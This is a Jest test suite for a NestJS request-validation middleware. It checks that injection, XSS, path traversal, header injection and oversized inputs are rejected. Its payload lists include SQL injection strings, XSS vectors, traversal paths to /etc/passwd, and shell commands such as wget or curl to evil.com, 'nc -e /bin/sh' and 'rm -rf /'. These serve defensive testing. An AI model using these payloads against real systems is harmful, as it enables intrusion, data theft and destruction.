/* eslint-disable @typescript-eslint/unbound-method */
/* eslint-disable @typescript-eslint/no-unsafe-assignment */
/* eslint-disable @typescript-eslint/no-unsafe-member-access */
/* eslint-disable @typescript-eslint/no-unsafe-call */
/* eslint-disable @typescript-eslint/no-unsafe-argument */

/**
 * RequestValidatorMiddleware Tests
 *
 * Comprehensive test suite for request validation and security threat detection
 */

import { BadRequestException } from '@nestjs/common';
import { ConfigService } from '@nestjs/config';
import { Test, TestingModule } from '@nestjs/testing';
import { Request, Response } from 'express';

import {
  RequestValidatorMiddleware,
  ValidatedRequest,
  getValidationResult,
  getSanitizedBody,
  getSanitizedQuery,
} from '../request-validator.middleware';

describe('RequestValidatorMiddleware', () => {
  let middleware: RequestValidatorMiddleware;

  /**
   * Create mock request
   */
  const createMockRequest = (
    options: {
      method?: string;
      path?: string;
      originalUrl?: string;
      body?: Record<string, unknown>;
      query?: Record<string, unknown>;
      headers?: Record<string, string>;
    } = {},
  ): Request => {
    return {
      method: options.method || 'GET',
      path: options.path || '/api/v1/test',
      originalUrl: options.originalUrl || options.path || '/api/v1/test',
      body: options.body,
      query: options.query || {},
      headers: {
        'content-type': 'application/json',
        ...options.headers,
      },
      ip: '127.0.0.1',
    } as unknown as Request;
  };

  /**
   * Create mock response
   */
  const createMockResponse = (): Response => {
    return {} as unknown as Response;
  };

  beforeEach(async () => {
    const module: TestingModule = await Test.createTestingModule({
      providers: [
        RequestValidatorMiddleware,
        {
          provide: ConfigService,
          useValue: {
            get: jest.fn((key: string, defaultValue?: unknown) => {
              const config: Record<string, unknown> = {
                VALIDATOR_MAX_BODY_SIZE: 1048576,
                VALIDATOR_MAX_URL_LENGTH: 2048,
                VALIDATOR_MAX_HEADER_SIZE: 8192,
                VALIDATOR_MAX_QUERY_PARAMS: 50,
                VALIDATOR_MAX_ARRAY_LENGTH: 1000,
                VALIDATOR_MAX_OBJECT_DEPTH: 10,
                VALIDATOR_ALLOWED_CONTENT_TYPES:
                  'application/json,application/x-www-form-urlencoded,multipart/form-data',
                VALIDATOR_SQL_INJECTION_CHECK: true,
                VALIDATOR_XSS_CHECK: true,
                VALIDATOR_PATH_TRAVERSAL_CHECK: true,
                VALIDATOR_COMMAND_INJECTION_CHECK: true,
              };
              return config[key] ?? defaultValue;
            }),
          },
        },
      ],
    }).compile();

    middleware = module.get<RequestValidatorMiddleware>(RequestValidatorMiddleware);
  });

  describe('SQL Injection Detection', () => {
    const sqlInjectionPayloads = [
      "'; DROP TABLE users; --",
      "1' OR '1'='1",
      "1; SELECT * FROM users",
      "UNION SELECT username, password FROM users",
      "1' OR 1=1 --",
      "admin'--",
      "1; DELETE FROM users WHERE 1=1",
      "'; EXEC xp_cmdshell('dir'); --",
      "SLEEP(5)",
      "BENCHMARK(10000000,SHA1('test'))",
      "1; WAITFOR DELAY '0:0:10'",
    ];

    it.each(sqlInjectionPayloads)('should detect SQL injection: %s', (payload) => {
      const req = createMockRequest({
        method: 'POST',
        body: { username: payload },
      });
      const res = createMockResponse();
      const next = jest.fn();

      expect(() => middleware.use(req, res, next)).toThrow(BadRequestException);
    });

    it('should allow legitimate SQL-like content in safe context', () => {
      const req = createMockRequest({
        method: 'POST',
        body: {
          description: 'This is a SELECT operation for the database query',
        },
      });
      const res = createMockResponse();
      const next = jest.fn();

      // This may or may not throw depending on implementation
      // The test verifies the behavior is consistent
      try {
        middleware.use(req, res, next);
        // If it doesn't throw, next should be called
        expect(next).toHaveBeenCalled();
      } catch (error) {
        expect(error).toBeInstanceOf(BadRequestException);
      }
    });
  });

  describe('XSS Detection', () => {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src="x" onerror="alert(1)">',
      '<svg onload="alert(1)">',
      'javascript:alert(1)',
      '<iframe src="javascript:alert(1)"></iframe>',
      '<body onload="alert(1)">',
      'onclick="alert(1)"',
      'expression(alert(1))',
      'data:text/html,<script>alert(1)</script>',
      'vbscript:msgbox("XSS")',
    ];

    it.each(xssPayloads)('should detect XSS attack: %s', (payload) => {
      const req = createMockRequest({
        method: 'POST',
        body: { content: payload },
      });
      const res = createMockResponse();
      const next = jest.fn();

      expect(() => middleware.use(req, res, next)).toThrow(BadRequestException);
    });

    it('should allow safe HTML-like content', () => {
      const req = createMockRequest({
        method: 'POST',
        body: {
          content: 'I love programming in TypeScript!',
        },
      });
      const res = createMockResponse();
      const next = jest.fn();

      middleware.use(req, res, next);
      expect(next).toHaveBeenCalled();
    });
  });

  describe('Path Traversal Detection', () => {
    const pathTraversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '%2e%2e%2f%2e%2e%2f',
      '....//....//etc/passwd',
      '%252e%252e%252f',
      '..%2f..%2f',
      '..%5c..%5c',
    ];

    it.each(pathTraversalPayloads)('should detect path traversal: %s', (payload) => {
      const req = createMockRequest({
        path: `/api/files/${payload}`,
        originalUrl: `/api/files/${payload}`,
      });
      const res = createMockResponse();
      const next = jest.fn();

      expect(() => middleware.use(req, res, next)).toThrow(BadRequestException);
    });

    it('should allow normal paths', () => {
      const req = createMockRequest({
        path: '/api/v1/users/123/profile',
      });
      const res = createMockResponse();
      const next = jest.fn();

      middleware.use(req, res, next);
      expect(next).toHaveBeenCalled();
    });
  });

  describe('Command Injection Detection', () => {
    const commandInjectionPayloads = [
      '; cat /etc/passwd',
      '| ls -la',
      '`whoami`',
      '$(cat /etc/passwd)',
      '&& rm -rf /',
      '|| wget http://evil.com/shell.sh',
      '${cat /etc/passwd}',
      '; nc -e /bin/sh',
      '| curl http://evil.com',
      '; chmod 777 /tmp/evil',
    ];

    it.each(commandInjectionPayloads)('should detect command injection: %s', (payload) => {
      const req = createMockRequest({
        method: 'POST',
        body: { command: payload },
      });
      const res = createMockResponse();
      const next = jest.fn();

      expect(() => middleware.use(req, res, next)).toThrow(BadRequestException);
    });
  });

  describe('URL Length Validation', () => {
    it('should reject URL exceeding max length', () => {
      const longPath = '/api/' + 'a'.repeat(2500);
      const req = createMockRequest({
        path: longPath,
        originalUrl: longPath,
      });
      const res = createMockResponse();
      const next = jest.fn();

      middleware.use(req, res, next);

      const validatedReq = req as ValidatedRequest;
      expect(validatedReq.validationResult?.errors.some((e) => e.code === 'URL_TOO_LONG')).toBe(
        true,
      );
    });

    it('should allow URL within max length', () => {
      const req = createMockRequest({
        path: '/api/v1/users',
      });
      const res = createMockResponse();
      const next = jest.fn();

      middleware.use(req, res, next);

      const validatedReq = req as ValidatedRequest;
      expect(validatedReq.validationResult?.errors.some((e) => e.code === 'URL_TOO_LONG')).toBe(
        false,
      );
    });
  });

  describe('Query Parameter Validation', () => {
    it('should reject too many query parameters', () => {
      const manyParams: Record<string, string> = {};
      for (let i = 0; i < 60; i++) {
        manyParams[`param${i}`] = `value${i}`;
      }

      const req = createMockRequest({
        query: manyParams,
      });
      const res = createMockResponse();
      const next = jest.fn();

      middleware.use(req, res, next);

      const validatedReq = req as ValidatedRequest;
      expect(
        validatedReq.validationResult?.errors.some((e) => e.code === 'TOO_MANY_QUERY_PARAMS'),
      ).toBe(true);
    });

    it('should allow reasonable number of query parameters', () => {
      const req = createMockRequest({
        query: { page: '1', limit: '10', sort: 'name' },
      });
      const res = createMockResponse();
      const next = jest.fn();

      middleware.use(req, res, next);

      const validatedReq = req as ValidatedRequest;
      expect(
        validatedReq.validationResult?.errors.some((e) => e.code === 'TOO_MANY_QUERY_PARAMS'),
      ).toBe(false);
    });
  });

  describe('Content Type Validation', () => {
    it('should reject unsupported content types for POST requests', () => {
      const req = createMockRequest({
        method: 'POST',
        body: { data: 'test' },
        headers: {
          'content-type': 'text/xml',
        },
      });
      const res = createMockResponse();
      const next = jest.fn();

      middleware.use(req, res, next);

      const validatedReq = req as ValidatedRequest;
      expect(
        validatedReq.validationResult?.errors.some((e) => e.code === 'INVALID_CONTENT_TYPE'),
      ).toBe(true);
    });

    it('should allow application/json content type', () => {
      const req = createMockRequest({
        method: 'POST',
        body: { data: 'test' },
        headers: {
          'content-type': 'application/json',
        },
      });
      const res = createMockResponse();
      const next = jest.fn();

      middleware.use(req, res, next);
      expect(next).toHaveBeenCalled();
    });

    it('should allow multipart/form-data content type', () => {
      const req = createMockRequest({
        method: 'POST',
        body: { data: 'test' },
        headers: {
          'content-type': 'multipart/form-data; boundary=----WebKitFormBoundary',
        },
      });
      const res = createMockResponse();
      const next = jest.fn();

      middleware.use(req, res, next);
      expect(next).toHaveBeenCalled();
    });
  });

  describe('Object Depth Validation', () => {
    it('should reject deeply nested objects', () => {
      let deepObject: Record<string, unknown> = { value: 'deep' };
      for (let i = 0; i < 15; i++) {
        deepObject = { nested: deepObject };
      }

      const req = createMockRequest({
        method: 'POST',
        body: deepObject,
      });
      const res = createMockResponse();
      const next = jest.fn();

      middleware.use(req, res, next);

      const validatedReq = req as ValidatedRequest;
      expect(
        validatedReq.validationResult?.errors.some((e) => e.code === 'OBJECT_TOO_DEEP'),
      ).toBe(true);
    });

    it('should allow reasonably nested objects', () => {
      const req = createMockRequest({
        method: 'POST',
        body: {
          level1: {
            level2: {
              level3: {
                value: 'ok',
              },
            },
          },
        },
      });
      const res = createMockResponse();
      const next = jest.fn();

      middleware.use(req, res, next);

      const validatedReq = req as ValidatedRequest;
      expect(
        validatedReq.validationResult?.errors.some((e) => e.code === 'OBJECT_TOO_DEEP'),
      ).toBe(false);
    });
  });

  describe('Array Length Validation', () => {
    it('should flag arrays exceeding max length', () => {
      const longArray = Array(1500)
        .fill(null)
        .map((_, i) => `item${i}`);

      const req = createMockRequest({
        method: 'POST',
        body: { items: longArray },
      });
      const res = createMockResponse();
      const next = jest.fn();

      middleware.use(req, res, next);

      const validatedReq = req as ValidatedRequest;
      expect(
        validatedReq.validationResult?.errors.some((e) => e.code === 'ARRAY_TOO_LONG'),
      ).toBe(true);
    });
  });

  describe('Header Validation', () => {
    it('should detect HTTP header injection', () => {
      const req = createMockRequest({
        headers: {
          'x-forwarded-host': 'evil.com\r\nX-Injected: header',
        },
      });
      const res = createMockResponse();
      const next = jest.fn();

      middleware.use(req, res, next);

      const validatedReq = req as ValidatedRequest;
      expect(
        validatedReq.validationResult?.errors.some((e) => e.code === 'HEADER_INJECTION'),
      ).toBe(true);
    });

    it('should detect invalid Host header', () => {
      const req = createMockRequest({
        headers: {
          host: 'example.com\r\nInjected: header',
        },
      });
      const res = createMockResponse();
      const next = jest.fn();

      middleware.use(req, res, next);

      const validatedReq = req as ValidatedRequest;
      expect(
        validatedReq.validationResult?.errors.some((e) => e.code === 'INVALID_HOST_HEADER'),
      ).toBe(true);
    });
  });

  describe('Null Byte Injection Detection', () => {
    it('should detect null byte in path', () => {
      const req = createMockRequest({
        path: '/api/files/test.txt\0.jpg',
        originalUrl: '/api/files/test.txt\0.jpg',
      });
      const res = createMockResponse();
      const next = jest.fn();

      middleware.use(req, res, next);

      const validatedReq = req as ValidatedRequest;
      expect(
        validatedReq.validationResult?.errors.some((e) => e.code === 'NULL_BYTE_INJECTION'),
      ).toBe(true);
    });

    it('should detect encoded null byte in path', () => {
      const req = createMockRequest({
        path: '/api/files/test.txt%00.jpg',
        originalUrl: '/api/files/test.txt%00.jpg',
      });
      const res = createMockResponse();
      const next = jest.fn();

      middleware.use(req, res, next);

      const validatedReq = req as ValidatedRequest;
      expect(
        validatedReq.validationResult?.errors.some((e) => e.code === 'NULL_BYTE_INJECTION'),
      ).toBe(true);
    });
  });

  describe('Data Sanitization', () => {
    it('should sanitize string values in body', () => {
      const req = createMockRequest({
        method: 'POST',
        body: {
          name: 'John <b>Doe</b>',
          description: "Test's \"value\"",
        },
      });
      const res = createMockResponse();
      const next = jest.fn();

      middleware.use(req, res, next);

      const validatedReq = req as ValidatedRequest;
      expect(validatedReq.sanitizedBody?.name).toBe('John &lt;b&gt;Doe&lt;&#x2F;b&gt;');
      expect(validatedReq.sanitizedBody?.description).toBe(
        'Test&#x27;s &quot;value&quot;',
      );
    });

    it('should sanitize nested object values', () => {
      const req = createMockRequest({
        method: 'POST',
        body: {
          user: {
            name: '<script>alert(1)</script>',
          },
        },
      });
      const res = createMockResponse();
      const next = jest.fn();

      // This will throw because of XSS detection
      expect(() => middleware.use(req, res, next)).toThrow(BadRequestException);
    });

    it('should sanitize array values', () => {
      const req = createMockRequest({
        method: 'POST',
        body: {
          tags: ['safe', 'test<tag>'],
        },
      });
      const res = createMockResponse();
      const next = jest.fn();

      middleware.use(req, res, next);

      const validatedReq = req as ValidatedRequest;
      const sanitizedTags = validatedReq.sanitizedBody?.tags as string[];
      expect(sanitizedTags[0]).toBe('safe');
      expect(sanitizedTags[1]).toBe('test&lt;tag&gt;');
    });
  });

  describe('Validation Result', () => {
    it('should attach validation result to request', () => {
      const req = createMockRequest({
        method: 'POST',
        body: { name: 'valid data' },
      });
      const res = createMockResponse();
      const next = jest.fn();

      middleware.use(req, res, next);

      const validatedReq = req as ValidatedRequest;
      expect(validatedReq.validationResult).toBeDefined();
      expect(validatedReq.validationResult?.isValid).toBe(true);
      expect(validatedReq.validationResult?.errors).toHaveLength(0);
    });

    it('should include all validation errors', () => {
      const req = createMockRequest({
        path: '/' + 'a'.repeat(3000),
        originalUrl: '/' + 'a'.repeat(3000),
        query: Object.fromEntries(
          Array(60)
            .fill(null)
            .map((_, i) => [`p${i}`, `v${i}`]),
        ),
      });
      const res = createMockResponse();
      const next = jest.fn();

      middleware.use(req, res, next);

      const validatedReq = req as ValidatedRequest;
      expect(validatedReq.validationResult?.errors.length).toBeGreaterThan(1);
    });
  });

  describe('Helper Functions', () => {
    describe('getValidationResult', () => {
      it('should return validation result from request', () => {
        const req = createMockRequest({
          method: 'POST',
          body: { name: 'test' },
        });
        const res = createMockResponse();
        const next = jest.fn();

        middleware.use(req, res, next);

        const result = getValidationResult(req);
        expect(result).toBeDefined();
        expect(result?.isValid).toBe(true);
      });
    });

    describe('getSanitizedBody', () => {
      it('should return sanitized body from request', () => {
        const req = createMockRequest({
          method: 'POST',
          body: { name: 'test value' },
        });
        const res = createMockResponse();
        const next = jest.fn();

        middleware.use(req, res, next);

        const body = getSanitizedBody(req);
        expect(body).toBeDefined();
        expect(body?.name).toBe('test value');
      });
    });

    describe('getSanitizedQuery', () => {
      it('should return sanitized query from request', () => {
        const req = createMockRequest({
          query: { search: 'test query' },
        });
        const res = createMockResponse();
        const next = jest.fn();

        middleware.use(req, res, next);

        const query = getSanitizedQuery(req);
        expect(query).toBeDefined();
        expect(query?.search).toBe('test query');
      });
    });
  });

  describe('Static Methods', () => {
    describe('containsThreats', () => {
      it('should detect script tags', () => {
        expect(RequestValidatorMiddleware.containsThreats('<script>alert(1)</script>')).toBe(true);
      });

      it('should detect javascript protocol', () => {
        expect(RequestValidatorMiddleware.containsThreats('javascript:void(0)')).toBe(true);
      });

      it('should detect SQL keywords', () => {
        expect(RequestValidatorMiddleware.containsThreats('SELECT * FROM users')).toBe(true);
      });

      it('should detect UNION SELECT', () => {
        expect(RequestValidatorMiddleware.containsThreats("1' UNION SELECT password")).toBe(true);
      });

      it('should detect path traversal', () => {
        expect(RequestValidatorMiddleware.containsThreats('../../../etc/passwd')).toBe(true);
      });

      it('should detect command injection', () => {
        expect(RequestValidatorMiddleware.containsThreats('; rm -rf /')).toBe(true);
      });

      it('should return false for safe content', () => {
        expect(RequestValidatorMiddleware.containsThreats('Hello, World!')).toBe(false);
      });
    });
  });

  describe('Edge Cases', () => {
    it('should handle empty body', () => {
      const req = createMockRequest({
        method: 'POST',
        body: {},
      });
      const res = createMockResponse();
      const next = jest.fn();

      middleware.use(req, res, next);
      expect(next).toHaveBeenCalled();
    });

    it('should handle null body', () => {
      const req = createMockRequest({
        method: 'POST',
        body: undefined,
      });
      const res = createMockResponse();
      const next = jest.fn();

      middleware.use(req, res, next);
      expect(next).toHaveBeenCalled();
    });

    it('should handle GET requests without body', () => {
      const req = createMockRequest({
        method: 'GET',
      });
      const res = createMockResponse();
      const next = jest.fn();

      middleware.use(req, res, next);
      expect(next).toHaveBeenCalled();
    });

    it('should preserve non-string values in body', () => {
      const req = createMockRequest({
        method: 'POST',
        body: {
          count: 42,
          active: true,
          price: 19.99,
          tags: null,
        },
      });
      const res = createMockResponse();
      const next = jest.fn();

      middleware.use(req, res, next);

      const validatedReq = req as ValidatedRequest;
      expect(validatedReq.sanitizedBody?.count).toBe(42);
      expect(validatedReq.sanitizedBody?.active).toBe(true);
      expect(validatedReq.sanitizedBody?.price).toBe(19.99);
      expect(validatedReq.sanitizedBody?.tags).toBeNull();
    });
  });

  describe('Performance', () => {
    it('should handle rapid validation efficiently', () => {
      const startTime = Date.now();

      for (let i = 0; i < 1000; i++) {
        const req = createMockRequest({
          method: 'POST',
          body: {
            name: `User ${i}`,
            email: `user${i}@example.com`,
            description: 'This is a test description',
          },
        });
        const res = createMockResponse();
        const next = jest.fn();

        middleware.use(req, res, next);
      }

      const duration = Date.now() - startTime;
      expect(duration).toBeLessThan(2000); // Should complete in under 2 seconds
    });
  });
});
